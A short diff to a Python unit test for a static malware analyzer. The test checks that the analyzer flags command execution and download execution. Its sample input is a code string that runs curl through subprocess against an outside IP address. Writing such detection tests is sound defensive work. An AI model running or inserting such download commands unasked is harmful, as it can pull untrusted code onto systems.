@@ -2,7 +2,7 @@ from static_analysis import analyze_static
 
 
 def test_detects_process_execution_and_networking():
-    result = analyze_static("import subprocess\\nsubprocess.run(['curl','http://1.2.3.4/p'])")
+    result = analyze_static("import subprocess\nsubprocess.run(['curl','http://1.2.3.4/p'])")
     assert "command_execution" in result["capabilities"]
     assert "download_execution" in result["capabilities"]
     assert result["finding_count"] >= 2
